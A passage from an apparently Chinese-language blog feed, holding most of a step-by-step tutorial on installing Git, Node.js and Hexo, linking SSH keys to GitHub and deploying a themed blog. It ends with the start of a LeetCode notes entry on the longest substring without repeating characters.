alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入选择凭据管理器页面，默认即可。</li></ul><blockquote><p>在第一次 push 或 pull 的时候，Git 凭据管理器会记录登录的行为，下次就可以免登录了。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/06bee93a9ea21.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入其他配置，默认即可。</li></ul><blockquote><p>分别是缓存机制和使用符号连接，默认只勾选第一个。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/538144897a479.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入最后一个页面！！！配置实验室功能。默认即可。</li></ul><blockquote><p>测试功能，可能有潜在 bug，建议保持默认。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/0c114189f587b.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Install</code>，等待进度条走完即可。</li></ul><img src="https://bu.dusays.com/2022/01/06/aae89708bbea5.webp" alt="" style="zoom:33%;" /><img src="https://bu.dusays.com/2022/01/06/4e92b3e43981a.webp" alt="" style="zoom:33%;" /><ol start="3"><li>检查是否安装成功。</li></ol><ul><li>按 <code>win+r</code>，在跳出的运行窗口输入 <code>cmd</code>，然后点击 <code>确定</code> 或直接键盘敲击 <code>Enter</code> 打开命令行窗口。</li></ul><img src="https://bu.dusays.com/2022/01/06/4de967a8ac03b.webp" alt="" style="zoom:33%;" /><img src="https://bu.dusays.com/2022/01/06/861a1ba79d0c5.webp" alt="" style="zoom: 25%;" /><ul><li>在命令行窗口输入 <strong>git --version</strong> 然后按 <code>Enter</code>，会得到 Git 的版本号。</li></ul><img src="https://bu.dusays.com/2022/01/06/70ac1a061c2be.webp" alt="" style="zoom:25%;" /><ul><li>至此，Git 安装完毕。</li></ul><h3 id="Node-js-安装">Node.js 安装</h3><ol><li>到 Node.js 官网下载 Node.js 安装包。</li></ol><img src="https://bu.dusays.com/2022/01/06/11be54231dab7.webp" alt="" style="zoom: 15%;" /><blockquote><p>左边 LTS 表示长期支持版，右边 Current 表示最新版，推荐选择 LTS，比较稳定。从左到右依次是 Windows 安装包，macOS 安装包和源代码，直接点击即可开始下载。</p><p>下方也可以选择其他版本的详细安装包，推荐直接在绿色区域点击自己的操作系统对应安装包。（.msi 是 Windows 系统的数据库文件，常用于安装包，可直接运行安装，请放心下载。）</p><p>提供 <a href="https://h-t-m.lanzoui.com/i2yyWw3o1bg">node-v16.13.0-x64蓝奏云</a> 下载。</p></blockquote><ol start="2"><li>安装 Node.js</li></ol><ul><li>下载完成后直接双击打开安装包，这里示范 node-v16.13.0-x64</li></ul><img src="https://bu.dusays.com/2022/01/06/451a96ab5b39c.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入许可协议页，务必选择同意，否则无法安装。</li></ul><img src="https://bu.dusays.com/2022/01/06/e4cb58f5359fa.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入安装目录选择页面，默认安装在C盘，可以自定义安装在别的地方，这里示范安装在D盘。</li></ul><blockquote><p>这一步往后**直接点击 <code>Next</code> **即可，默认配置就足够了。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/7847ed6989e1c.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入自定义安装界面，默认即可。</li></ul><blockquote><p>分别表示运行环境，npm 包管理器，在线文档快捷方式以及添加环境变量。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/b53dada4f948d.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入本地模块工具安装界面，默认即可。</li></ul><blockquote><p>因为需要访问外网，所以建议保持默认不勾选。</p><p>但是在使用npm安装一些模块的时候可能会报错，建议安装完成之后再手动安装对应组件。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/f186786b59fdc.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Next</code> 进入确认安装页面。</li></ul><img src="https://bu.dusays.com/2022/01/06/6057c0ecac353.webp" alt="" style="zoom:33%;" /><ul><li>点击 <code>Install</code> 开始安装，等待进度条走完即可。</li></ul><img src="https://bu.dusays.com/2022/01/06/4d7fdfcef0359.webp" alt="" style="zoom:33%;" /><img src="https://bu.dusays.com/2022/01/06/94a5b1e4f1858.webp" alt="" style="zoom:33%;" /><ol start="3"><li>检查是否安装成功。</li></ol><ul><li>按 <code>win+r</code>，在跳出的运行窗口输入 <code>cmd</code>，然后点击 <code>确定</code> 或直接键盘敲击 <code>Enter</code> 打开命令行窗口。</li></ul><img src="https://bu.dusays.com/2022/01/06/4de967a8ac03b.webp" alt="" style="zoom:33%;" /><img src="https://bu.dusays.com/2022/01/06/861a1ba79d0c5.webp" alt="" style="zoom: 25%;" /><ul><li>在命令行窗口输入 <strong>node -v</strong> 然后按 <code>Enter</code>，会得到 Node.js 的版本号；然后继续在命令行窗口输入 <strong>npm -v</strong> 然后按 <code>Enter</code>，会得到 npm 的版本号。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/01/06/70ac1a061c2be.webp" style="zoom: 25%;" /><ul><li>至此，Node.js 安装完毕。</li></ul><h3 id="Hexo-安装">Hexo 安装</h3><blockquote><p>Hexo 基于 Node.js 开发，需要利用 Node.js 的 npm 安装工具来安装，因此请务必完成前面的安装。</p></blockquote><ul><li>按 <code>win+r</code>，在跳出的运行窗口输入 <code>cmd</code>，然后点击 <code>确定</code> 或直接键盘敲击 <code>Enter</code> 打开命令行窗口。</li></ul><img src="https://bu.dusays.com/2022/01/06/4de967a8ac03b.webp" alt="" style="zoom:33%;" /><img src="https://bu.dusays.com/2022/01/06/861a1ba79d0c5.webp" alt="" style="zoom: 25%;" /><ul><li>在命令行窗口输入 <strong>npm install hexo-cli -g</strong> 然后按 <code>Enter</code>，等待 Hexo 安装完毕。</li></ul><blockquote><p>若运行完成后无标红的报错和标黄的警告则可认为安装成功。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/01/06/3209e700b2ac4.webp" alt="" style="zoom:25%;" /><ul><li>存在错误请看此条，安装成功请忽略。</li></ul><blockquote><p>—— 若出现错误，可输入如下两行代码，利用淘宝镜像来安装</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">cnpm install hexo-cli -g</span><br><span class="line"></span><br><span class="line"># 以后直接用 cnpm 替换 npm 即可！如有可选更新，cnpm 也可以进行升级。</span><br></pre></td></tr></table></figure></blockquote><ul><li>检查是否安装成功，在命令行窗口输入 <strong>hexo -v</strong> 然后按 <code>Enter</code>，会得到 hexo 及其工具的版本号。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/01/06/8ee84fe4f38e3.webp" alt="" style="zoom:25%;" /><ul><li>至此，Hexo 安装完毕。</li></ul><h2 id="GitHub-配置">GitHub 配置</h2><h3 id="GitHub-注册">GitHub 注册</h3><ul><li>从浏览器进入 <a href="https://github.com/">GitHub 官网</a>。</li></ul><img src="https://bu.dusays.com/2022/01/06/8e92904759b05.webp" alt="" style="zoom:25%;" /><ul><li>点击右上角 <code>Sign up</code> 或左侧 <code>Sign up for GitHub</code> 进入 GitHub 注册页面。</li></ul><blockquote><p>输入你的邮箱 ** ** ** <strong>@</strong> **.com。</p><p>邮箱输入成功之后会让你设置密码。</p><p>设置密码后会让你设置用户名，用户名只能使用字母数字字符和连字符。</p><p>输入之后前面出现绿色的勾才能点击下一步，请牢记用户名和密码。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/e1a7d05fdc587.webp" alt="" style="zoom:25%;" /><ul><li>设置好用户名之后会询问你是否愿意接收产品更新和公告。需要则输入 y 后按 <code>Continue</code>，否则输入n。</li></ul><img src="https://bu.dusays.com/2022/01/06/32990f472e801.webp" alt="" style="zoom:25%;" /><ul><li>在跳出的验证中按照指示完成验证，完成后按 <code>Create account</code>。</li></ul><img src="https://bu.dusays.com/2022/01/06/e5bc845adfa93.webp" alt="" style="zoom: 25%;" /><ul><li>GitHub 会往你输入的邮箱中发送验证码，将接收到的验证码输入框中并按下 <code>Enter</code> 键即可完成账号创建。</li></ul><img src="https://bu.dusays.com/2022/01/06/e831f5ff779f8.webp" alt="" style="zoom:25%;" /><ul><li>创建成功后会让你回答一些问题，可根据实际情况选择（非必须）。</li></ul><blockquote><p>第一个选择一起工作的人数，选择 <code>Just me</code> 即可；</p><p>第二个询问是学生还是老师，选择 <code>学生</code> 即可；</p><p>第三个直接划到最下面选择 <code>Community</code> 即可。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/8947f13061a61.webp" alt="" style="zoom:25%;" /><img src="https://bu.dusays.com/2022/01/06/29d48d3257c55.webp" alt="" style="zoom:25%;" /><ul><li>如果选择了学生，会邀请你进行验证领取学生特权（非必须）。</li></ul><img src="https://bu.dusays.com/2022/01/06/741fc17b08422.webp" alt="" style="zoom:25%;" /><ul><li>重新进入 <a href="https://github.com/">GitHub 官网</a>，账号会自动登录，若没有则按右上角 <code>Sign in</code> 输入用户名和密码登录即可。</li></ul><img src="https://bu.dusays.com/2022/01/06/f22ca0638e1bc.webp" alt="" style="zoom:25%;" /><ul><li>至此，GitHub 账户创建成功。</li></ul><h3 id="GitHub仓库搭建">GitHub仓库搭建</h3><ul><li>登录 GitHub 账户，点击左侧绿色按钮 <code>Create repository</code> 创建仓库。</li></ul><img src="https://bu.dusays.com/2022/01/06/e2e746bf0d718.webp" alt="" style="zoom: 25%;" /><blockquote><p>若左侧没有显示，可点击右上角头像选择 <code>Your repositories</code>；</p><img src="https://bu.dusays.com/2022/01/06/fa446e681e08b.webp" alt="" style="zoom:20%;" /><p>然后点击右侧绿色的按钮 <code>New</code> 即可进入新建仓库页面。</p><img src="https://bu.dusays.com/2022/01/06/94382f3824007.webp" alt="" style="zoom:20%;" /></blockquote><ul><li>在第一行输入仓库名，格式为：<strong><a href="http://xn--eqr924avxo.github.io">用户名.github.io</a></strong>，第二行描述内容选填。</li></ul><blockquote><p>一般创建仓库名称可以自定义（不能使用中文字符），由于需要用这个仓库搭建网站，因此必须要设置为</p><p><strong><a href="http://xn--eqr924avxo.github.io">用户名.github.io</a></strong> 的格式。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/a10046b59d95c.webp" alt="" style="zoom:25%;" /><ul><li>确保这里选择为 <code>Public</code>，然后点击下面 <code>Create repository</code>。</li></ul><img src="https://bu.dusays.com/2022/01/06/5ecc2e66d1d21.webp" alt="" style="zoom:25%;" /><ul><li>一个空的仓库就已经搭建好了。</li></ul><img src="https://bu.dusays.com/2022/01/06/21fba4a96ee85.webp" alt="" style="zoom:25%;" /><h3 id="GitHub-连接本地">GitHub 连接本地</h3><ol><li>生成 SSH</li></ol><ul><li>桌面右击选择 <code>Git Bash Here</code>，或者在任意文件夹内右击。（示范为 Windows11 系统，因此还要再点击最后一行 <code>显示更多选项</code>。）</li></ul><img src="https://bu.dusays.com/2022/01/06/6f65fd5c5c0b0.webp" alt="" style="zoom:25%;" /><img src="https://bu.dusays.com/2022/01/06/0d6f862d49411.webp" alt="" style="zoom:25%;" /><ul><li>在打开的Git窗口中输入代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure><blockquote><p>其中邮件地址为注册 GitHub 所用的邮件地址。</p><p>窗口暂停时直接按 <code>Enter</code> 直到运行结束即可（如图），一共按四次。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/d0e74d50df830.webp" alt="" style="zoom: 50%;" /><ul><li>打开<strong>此电脑</strong>进入 <strong>C盘</strong>，进入**用户（user）**文件夹，然后点进自己电脑用户名对应的文件夹，这里是 <strong>15475</strong>，默认为 <strong>Administrator</strong>。</li></ul><img src="https://bu.dusays.com/2022/01/06/02580c95758d5.webp" alt="" style="zoom:50%;" /><img src="https://bu.dusays.com/2022/01/06/1040591975c40.webp" alt="" style="zoom:50%;" /><ul><li>（能看到 .ssh 文件夹的忽略这步）因为是隐藏文件夹，所以要右上角点击选择<strong>选项</strong>，选择<strong>查看</strong>，选择<strong>显示隐藏的文件、文件夹和驱动器</strong>。</li></ul><img src="https://bu.dusays.com/2022/01/06/ee1f34739c5c4.webp" alt="" style="zoom:50%;" /><img src="https://bu.dusays.com/2022/01/06/0cdcc19bdaca9.webp" alt="" style="zoom:33%;" /><ul><li>点击进入用户名文件夹中的 <strong>.ssh</strong> 文件夹。找到 <strong>id_rsa.pub</strong> 文件用 VScode 打开。</li></ul><img src="https://bu.dusays.com/2022/01/06/60590e5c69618.webp" alt="" style="zoom: 80%;" /><img src="https://bu.dusays.com/2022/01/06/889bad9dc8232.webp" alt="" style="zoom: 33%;" /><ul><li>按 <code>Ctrl+a</code> 选中全部，然后复制这串字符。</li></ul><img src="https://bu.dusays.com/2022/01/06/5ff54376a651e.webp" alt="" style="zoom: 33%;" /><ol start="2"><li>连接本地</li></ol><ul><li>进入并登录 <a href="https://github.com/">GitHub官网</a>。点击右上角跳出菜单倒数第二行的 <code>Settings</code>。</li></ul><img src="https://bu.dusays.com/2022/01/06/916fa1fa1b7aa.webp" alt="" style="zoom: 25%;" /><ul><li>点击页面右侧的 <strong>SSH and GPG keys</strong>，然后点击右上角绿色的 <code>New SSH key</code>。</li></ul><img src="https://bu.dusays.com/2022/01/06/8cbfb7cccd292.webp" alt="" style="zoom: 25%;" /><ul><li><strong>Title</strong> 部分可随意写，**Key **部分则将之前从 <strong>id_rsa.pub</strong> 文件里复制出来的一串字符粘贴在这里，然后点击下方绿色的 <code>Add SSH key</code>。</li></ul><img src="https://bu.dusays.com/2022/01/06/74dcd2d21fa8f.webp" alt="" style="zoom:25%;" /><ul><li>如图则添加完成</li></ul><img src="https://bu.dusays.com/2022/01/06/28a3089fcd663.webp" alt="" style="zoom:25%;" /><ul><li>再次在桌面右击打开 <strong>Git Bash Here</strong>，输入:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/01/06/b0b015a6e4299.webp" alt="" style="zoom:50%;" /><ul><li>在上图输入 <strong>yes</strong> 然后按 <code>Enter</code>，只要最终显示这句话即为成功：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi 你的用户名! You&#x27;ve successfully authenticated, </span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2022/01/06/b545e22833b7f.webp" alt=""></p><h2 id="博客创建">博客创建</h2><h3 id="本地准备">本地准备</h3><ul><li>在任意处新建一个文件夹，这个文件夹就作为本地的博客。在空文件夹空白处右击选择 <strong>Git Bash Here</strong>。</li></ul><img src="https://bu.dusays.com/2022/01/06/e5a8cf83e47b9.webp" alt="" style="zoom: 33%;" /><ul><li>在打开的窗口输入初始化 Hexo 的命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><blockquote><p>由于 GitHub 服务器在国外，可能会出现连接超时，重试即可。</p><p>当出现 <strong>Start blogging with Hexo</strong> 时，说明初始化成功。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/64769248e3e7e.webp" alt="" style="zoom: 50%;" /><ul><li>完成后原文件夹会出现如下文件</li></ul><blockquote><ul><li><code>_config.yml</code>：俗称站点配置文件，很多与博客网站的格式、内容相关的设置都需要在里面改。</li><li><code>node_modules</code>:存储 Hexo 插件的文件，可以实现各种扩展功能。一般不需要管。</li><li><code>scaffolds</code>：模板文件夹，里面的 <code>post.md</code> 文件可以设置每一篇博客的模板。具体用起来就知道能干嘛了。</li><li><code>source</code>：非常重要。所有的个人文件都在里面！</li><li><code>themes</code>：主题文件夹，可以从 <a href="https://hexo.io/themes/">Hexo 主题官网</a>或者网上大神的 Github 主页下载各种各样美观的主题，让自己的网站变得逼格高端。</li></ul></blockquote><img src="https://bu.dusays.com/2022/01/06/2926c9abaf260.webp" alt="" style="zoom:33%;" /><ul><li>继续在 <strong>Git Bash Here</strong> 打开的窗口中输入开启本地服务命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><blockquote><p>开启成功后即可在浏览器输入http://localhost:4000访问博客。</p><p>因端口被占用这里示范使用代码： <strong>hexo s -p 2000</strong> 将端口换至2000。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/8095cf6e417c7.webp" alt="" style="zoom:33%;" /><ul><li>打开页面如图，该页面为 Hexo 的默认主题页面。</li></ul><img src="https://bu.dusays.com/2022/01/06/43b8883b9cd3a.webp" alt="" style="zoom:25%;" /><h3 id="连接准备">连接准备</h3><ul><li>先安装 <strong>hexo-deployer-git</strong> 插件，在博客文件夹右击选择 <strong>Git Bash Here</strong> 打开的窗口中输入安装命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><blockquote><p>利用这个插件我们可以把生成的 <code>public</code> 文件夹部署到 Github 或者其他代码托管平台。</p><p>示范为重复部署，页面并不准确。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/20f9f46bee17c.webp" alt="" style="zoom:25%;" /><ul><li>打开 GitHub 的仓库页面获取自己的仓库地址</li></ul><blockquote><p>注意需要的是 SSH 地址。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/6b4a1f1ca87d2.webp" alt="" style="zoom:33%;" /><img src="https://bu.dusays.com/2022/01/06/03d5b52d3e921.webp" alt="" style="zoom: 25%;" /><ul><li>用 VScode 打开博客根目录的文件。</li></ul><img src="https://bu.dusays.com/2022/01/06/043d2c8199f75.webp" alt="" style="zoom:33%;" /><ul><li>将文件尾部代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type:</span><br></pre></td></tr></table></figure><p>​修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:h-t-m-2/h-t-m-2.github.io.git  #替换成自己的地址即可 </span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><blockquote><ul><li>deploy: 部署的意思，一个关键词。</li><li>type：部署的类型，这里选择的是 git，就是上面我们已经安装的那个。</li><li>repo：仓库的意思，我们所有的本地文件都要上传到这里。</li><li>branch：仓库的分支。</li><li>注意冒号后面有一个空格！</li></ul></blockquote><img src="https://bu.dusays.com/2022/01/06/c5ee725c084bc.webp" alt="" style="zoom: 25%;" /><img src="https://bu.dusays.com/2022/01/06/13d41796608d8.webp" alt="" style="zoom:25%;" /><h3 id="连接仓库">连接仓库</h3><ul><li>博客文件夹右击点击 <strong>Git Bash Here</strong> 打开 <strong>Git</strong> 窗口，输入以下两条代码：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;h-t-m-2&quot;</span></span><br><span class="line">git config --global user.email h-t-m-223@163.com</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://user.name">user.name</a> 后面输入 GitHub 的用户名（加上双引号）。</p><p>user.email 后面输入注册 GitHub 时用的邮箱。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/e5a8cf83e47b9.webp" alt="" style="zoom: 33%;" /><img src="https://bu.dusays.com/2022/01/06/0c1bdc21b01e5.webp" alt="" style="zoom:33%;" /><h3 id="部署博客">部署博客</h3><ul><li>继续在 <strong>Git</strong> 窗口输入以下代码：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>hexo cl</strong>是 **hexo clean **的简写。意思是清除本地的缓存，实际上就是把博客文件夹下的 <strong>public</strong> 文件夹删除掉了。这个 <strong>public</strong> 是基于本地的文件生成的、用于上传到仓库或者其他网站服务器上的文件夹，可以理解为本地文件上网的中转站、交通工具，删掉了也不影响本地的内容。</li><li><strong>hexo g</strong> 是 <strong>hexo generate</strong> 的简写，意思是生成 public 文件夹。</li><li><strong>hexo d</strong>是 <strong>hexo deploy</strong> 的简写，意思是将生成的 public 文件夹部署到网上，我们这里是部署到 github 上面。</li><li>三条命令可分别输入。</li></ul></blockquote><img src="https://bu.dusays.com/2022/01/06/89bca77f2505c.webp" alt="" style="zoom: 50%;" /><ul><li>回到 GitHub 仓库页面，本地文件已经上传成功</li></ul><img src="https://bu.dusays.com/2022/01/06/39f62848012ce.webp" alt="" style="zoom:25%;" /><ul><li>在浏览器打开 <strong><a href="http://xn--eqr924avxo.github.io">用户名.github.io</a></strong>，就可以在线访问我们创建的博客了。</li></ul><img src="https://bu.dusays.com/2022/01/06/1d30db06c6981.webp" alt="" style="zoom:25%;" /><h2 id="主题设置">主题设置</h2><ul><li>可以到 <a href="https://hexo.io/themes/">Hexo 官网主题</a>页面找到自己喜欢的主题。</li></ul><img src="https://bu.dusays.com/2022/01/06/63bf955141f0f.webp" alt="" style="zoom:25%;" /><ul><li>示范使用 <strong>keep</strong> 主题：</li></ul><img src="https://bu.dusays.com/2022/01/06/361d794965c22.webp" alt="" style="zoom:50%;" /><blockquote><ul><li>点击图片可转到预览网页：</li></ul><img src="https://bu.dusays.com/2022/01/06/b2a30261b6316.webp" alt="" style="zoom:25%;" /><ul><li>点击主题名可转到该主题的 GitHub 页面：</li></ul><img src="https://bu.dusays.com/2022/01/06/774b960535e6d.webp" alt="" style="zoom:25%;" /><ul><li>在 GitHub 主页往下滑，可以看到官方文档，有主题安装的详细说明：</li></ul><img src="https://bu.dusays.com/2022/01/06/d68d403746ab6.webp" alt="" style="zoom:25%;" /></blockquote><ul><li>在本地博客文件夹右击选择 <strong>Git Bash Here</strong> 打开 <strong>Git</strong> 窗口。</li></ul><img src="https://bu.dusays.com/2022/01/06/b3376a54af963.webp" alt="" style="zoom:25%;" /><ul><li>在 <strong>Git</strong> 窗口输入以下代码以将该主题的源文件从GitHub拷贝到博客的 <strong>themes</strong> 文件夹中：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/XPoet/hexo-theme-keep themes/keep</span><br></pre></td></tr></table></figure><blockquote><ul><li>在5.0及以上版本的Hexo中，支持直接输入以下代码安装主题，此代码不会将主题文件放入 themes 文件夹中，而是放在 node_modules 文件夹中</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-theme-keep</span><br></pre></td></tr></table></figure></blockquote><img src="https://bu.dusays.com/2022/01/06/d5c3b3726b9a4.webp" alt="" style="zoom:33%;" /><blockquote><ul><li><p>若上述代码无法安装，可直接在主题的 GitHub 主页把文件拷贝下来。</p></li><li><p>点击主页 <code>Code</code> 下的 <strong>Download ZIP</strong> 即可直接打包下载（速度慢可自行百度加速）。</p></li><li><p>下载完成后解压并将文件夹放至本地博客文件夹的 <strong>themes</strong> 文件夹中。</p></li></ul><img src="https://bu.dusays.com/2022/01/06/1aec7dc397596.webp" alt="" style="zoom:25%;" /></blockquote><ul><li>安装完成后可在本地博客文件夹里看到新增的主题文件夹。</li></ul><img src="https://bu.dusays.com/2022/01/06/9223665c47673.webp" alt="" style="zoom:25%;" /><ul><li>打开本地博客文件夹的 <strong>config.yml</strong> 配置文件。</li></ul><img src="https://bu.dusays.com/2022/01/06/ec1c969449730.webp" alt="" style="zoom:33%;" /><ul><li><p>将配置文件中的 **theme: **后面改为主题的名称。</p><blockquote><p>注意冒号后面有一个空格且名称应与主题文件夹的名称相同。</p></blockquote></li></ul><img src="https://bu.dusays.com/2022/01/06/51de70ccbb04c.webp" alt="" style="zoom: 33%;" /><img src="https://bu.dusays.com/2022/01/06/f9e73da65e159.webp" alt="" style="zoom:33%;" /><ul><li>在本地博客文件夹右击选择 <strong>Git Bash Here</strong> 打开 <strong>Git</strong> 窗口。输入以下代码：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><blockquote><p>可输入 <strong>hexo g &amp;&amp; hexo s</strong> 先在本地访问 http://localhost:4000预览之后再输入 <strong>hexo d</strong> 上传部署。</p></blockquote><img src="https://bu.dusays.com/2022/01/06/5390a6d57e27f.webp" alt="" style="zoom:33%;" /><ul><li>然后在浏览器中输入地址（<a href="http://xn--eqr924avxo.github.io">用户名.github.io</a>）即可访问更新主题后的博客。</li></ul><img src="https://bu.dusays.com/2022/01/06/2b853a17dbbce.webp" alt="" style="zoom: 25%;" /><ul><li>主题更新完成，之后可根据官方文档进一步设置来自定义设计博客的样式。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 建站 </tag>
            
            <tag> 博客 </tag>
            
            <tag> GitHub </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 2</title>
      <link href="/posts/2464c9fc/"/>
      <url>/posts/2464c9fc/</url>
      
        <content type="html"><![CDATA[<h2 id="3-无重复字符的最长子串"><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><p>难度：中等</p><p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br></pre></td></tr></table></figure><p><strong>示例 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span><br><span class="line">     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure><p><strong>示例 4:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;&quot;</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>0 &lt;= s.length &lt;= 5 * 104</code></li><li><code>s</code> 由英文字母、数字、符号和空格组成</li></ul><h3 id="我的答案">我的答案</h3><p><strong>思路</strong>：通过数组下标方式遍历字符串并逐个比较，需要考虑非常多种可能的输入。（多次修改后最终用经典暴力求解法得出（也许）准确的答案）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span 